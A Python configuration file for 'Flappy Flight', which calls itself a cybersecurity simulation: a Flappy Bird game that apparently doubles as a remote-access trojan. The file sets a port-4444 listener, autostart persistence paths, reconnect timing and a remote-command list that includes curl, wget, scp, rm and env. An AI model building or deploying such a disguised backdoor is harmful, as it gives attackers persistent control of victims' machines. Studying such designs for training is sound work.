"""
Flappy Flight - Shared Configuration
All configurable values for the Flappy Flight cybersecurity simulation.
"""

import os

# ─── Network Configuration ───
LISTENER_HOST = "0.0.0.0"
LISTENER_PORT = 4444

# ─── Application Metadata ───
APP_NAME = "Flappy Flight"
PERSISTENCE_NAME = "flappyflight"
VERSION = "1.0.0"

# ─── Paths ───
HOME_DIR = os.path.expanduser("~")
AUTOSTART_DIR = os.path.join(HOME_DIR, ".config", "autostart")
INSTALL_DIR = os.path.join(HOME_DIR, ".local", "share", PERSISTENCE_NAME)
AUTOSTART_ENTRY = os.path.join(AUTOSTART_DIR, f"{PERSISTENCE_NAME}.desktop")
LAUNCHER_SCRIPT = os.path.join(INSTALL_DIR, f"{PERSISTENCE_NAME}_launcher.sh")

# ─── Project Root ───
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))

# ─── Allowed Commands (safe commands only) ───
ALLOWED_COMMANDS = [
    # System info & users
    "whoami", "hostname", "uname", "date", "id", "uptime", "df",
    "echo", "env", "printenv", "arch", "who", "w", "last",
    "ps", "top", "htop", "free",
    
    # Network
    "ifconfig", "ip", "netstat", "ss", "ping", "curl", "wget",
    
    # File system navigation & viewing
    "ls", "pwd", "cd", "cat", "tail", "head", "less", "more", "file", "stat",
    "find", "locate", "whereis", "which",
    
    # File manipulation
    "touch", "mkdir", "rmdir", "rm", "cp", "mv", "grep", "awk", "sed",
    "nano", "vim", "vi", "tar", "gzip", "gunzip", "zip", "unzip", "scp",
]

# ─── Client Settings ───
RECONNECT_DELAY = 5        # Initial reconnection delay in seconds
MAX_RECONNECT_DELAY = 60   # Maximum reconnection delay
BUFFER_SIZE = 4096         # Socket buffer size

# ─── Game Settings ───
SCREEN_WIDTH = 400
SCREEN_HEIGHT = 600
FPS = 60
GAME_TITLE = f"{APP_NAME} - Flappy Bird"
